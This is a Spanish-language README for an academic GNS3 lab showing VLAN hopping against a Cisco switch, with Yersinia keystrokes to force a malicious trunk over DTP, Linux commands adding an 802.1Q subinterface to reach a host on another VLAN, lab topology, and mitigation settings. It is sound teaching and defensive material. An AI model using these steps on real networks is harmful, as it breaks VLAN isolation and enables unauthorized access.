# DTP-ATTACK-VLAN-HOPPING

> **Autor:** Randy Nin **Laboratorio de Seguridad de Redes | GNS3**

Demostración de VLAN Hopping en dos fases mediante explotación del protocolo DTP (Dynamic Trunking Protocol) de Cisco. En la primera fase, Yersinia fuerza al switch víctima a negociar un trunk malicioso en su puerto de acceso enviando tramas DTP de tipo "enabling trunking". En la segunda fase, se crea una subinterfaz Linux con tag 802.1Q para cruzar el aislamiento de VLAN y alcanzar directamente hosts en segmentos a los que no se tiene acceso legítimo, sin pasar por ningún dispositivo de Capa 3.

---

## Contenido del repositorio

```
DTP-ATTACK-VLAN-HOPPING/
├── Documentación Tecnica Profesional DTP-ATTACK VLAN HOPPING (Randy Nin -- 2025-0660).md
└── README.md
```

> Este laboratorio utiliza Yersinia, una herramienta preinstalada en Kali Linux. No se incluye script propio.

---

## Documentación técnica

La documentación técnica completa de este laboratorio está disponible en:

**[Documentación Tecnica Profesional DTP-ATTACK VLAN HOPPING (Randy Nin -- 2025-0660).md](Documentación%20Tecnica%20Profesional%20DTP-ATTACK%20VLAN%20HOPPING%20(Randy%20Nin%20--%202025-0660).pdf)**

Incluye contexto técnico de DTP y su vulnerabilidad, configuración completa del entorno con VTP y VLANs, procedimiento de uso de Yersinia en modo interactivo, análisis técnico del BPDU DTP enviado, evidencia del trunk establecido, demostración del VLAN Hopping con subinterfaz eth0.2, contramedidas y nota adicional sobre Double Tagging.

---

## Requisitos

**Sistema:** Kali Linux (Yersinia preinstalado), ParrotSec OS o cualquier distribución Linux compatible.

**Privilegios:** Ejecución obligatoria con `sudo`.

**Instalación de Yersinia** (si no está disponible):

```bash
sudo apt update && sudo apt install yersinia -y
```

**Módulo del kernel para 802.1Q** (necesario para la fase de VLAN Hopping):

```bash
sudo modprobe 8021q
```

---

## Cómo funciona

El ataque se desarrolla en dos fases independientes:

**Fase 1 - Negociación del trunk malicioso con Yersinia:**

```bash
sudo yersinia -I
```

Dentro de la interfaz interactiva:

|Tecla|Acción|
|:-:|:--|
|`g`|Seleccionar protocolo DTP|
|`x`|Abrir panel de ataques|
|`1` + `Enter`|Ejecutar "enabling trunking"|

Yersinia envía tramas DTP anunciando modo `desirable`. El puerto Gi0/0 de Sw-3 (en modo `dynamic auto` por defecto) responde a la negociación y transiciona automáticamente a modo trunk con encapsulación n-802.1Q, permitiendo VLANs 1-4094.

**Fase 2 - VLAN Hopping con subinterfaz 802.1Q:**

```bash
sudo modprobe 8021q
sudo ip link add link eth0 name eth0.2 type vlan id 2
sudo ip addr add 25.6.60.131/25 dev eth0.2
sudo ip link set dev eth0.2 up
```

La subinterfaz `eth0.2` etiqueta todo el tráfico saliente con el tag 802.1Q de VLAN 2. El trunk activo en Gi0/0 propaga esas tramas al segmento de VLAN 2, donde PC1 reside.

---

## Entorno de laboratorio

|Dispositivo|Rol|VLAN|IP|
|:--|:--|:--|:--|
|R-1|Gateway / DHCP / NAT (router-on-a-stick)|VLAN 1|25.6.60.1/25|
|Sw-1|VTP Server / Switch troncal|1 y 2|N/A|
|Sw-2|VTP Client|Gi0/0: acceso VLAN 2|N/A|
|Sw-3|VTP Client / Switch víctima|Gi0/0: acceso VLAN 1 (DTP auto)|N/A|
|PC1|Host víctima|VLAN 2|25.6.60.130/25|
|KaliLinux|Atacante|VLAN 1 / VLAN 2 (eth0.2)|25.6.60.131/25 (post-ataque)|

|VLAN|Red|Dispositivos|
|:--|:--|:--|
|1|25.6.60.0/25|Gateway R-1 (25.6.60.1), Kali (atacante)|
|2|25.6.60.128/25|PC1 (25.6.60.130)|

> El puerto Gi0/0 de Sw-3 opera en modo `dynamic auto` por defecto, sin ninguna configuración explícita. Es el vector del ataque.

---

## Impacto observado

- Gi0/0 de Sw-3 transiciona de access a trunk con vlans permitidas 1-4094 (sin las restricciones de los trunks configurados explícitamente que solo permiten 1-2)
- El atacante en VLAN 1 obtiene visibilidad directa sobre VLAN 2 y todas las demás VLANs de la infraestructura
- Ping exitoso desde Kali (VLAN 1) a PC1 (VLAN 2): 25.6.60.130 responde sin pasar por ningún dispositivo de Capa 3
- El aislamiento lógico entre VLANs queda completamente comprometido desde el puerto de acceso del atacante

---

## Mitigación

Desactivar DTP en todos los puertos de acceso orientados hacia dispositivos finales y puertos no utilizados:

```
Sw-3(config)# interface GigabitEthernet0/0
Sw-3(config-if)# switchport mode access
Sw-3(config-if)# switchport nonegotiate
Sw-3(config-if)# exit
Sw-3(config)# do write memory
```

|Comando|Función|
|:--|:--|
|`switchport mode access`|Fija el puerto en modo acceso permanente, imposibilitando cualquier transición a trunk|
|`switchport nonegotiate`|Desactiva DTP por completo: el puerto no envía ni procesa ninguna trama DTP|

Con ambos comandos activos, Yersinia puede seguir enviando tramas DTP pero el switch las ignora. Gi0/0 permanece en modo acceso de forma definitiva.

> **Nota:** Existe una técnica alternativa de VLAN Hopping que no depende de DTP: Double Tagging. Las contramedidas específicas para este vector (cambio de VLAN nativa, eliminación de VLAN 1 como VLAN operacional) están documentadas en detalle en el informe técnico.

---

## Video demostrativo

**Enlace:** [https://www.youtube.com/watch?v=vkCud24CQA8&list=PLxMefEiS_P6qxDUldXrtZpiMe3V1EW5yi](https://www.youtube.com/watch?v=vkCud24CQA8&list=PLxMefEiS_P6qxDUldXrtZpiMe3V1EW5yi)

---

## Disclaimer

Este laboratorio fue desarrollado con fines exclusivamente académicos y educativos. Su uso está permitido únicamente en entornos propios o autorizados como GNS3, EVE-NG o laboratorios internos de prueba. El uso en redes de producción o de terceros sin autorización expresa constituye una violación legal.

---

_Randy Nin / Matrícula 2025-0660_

---
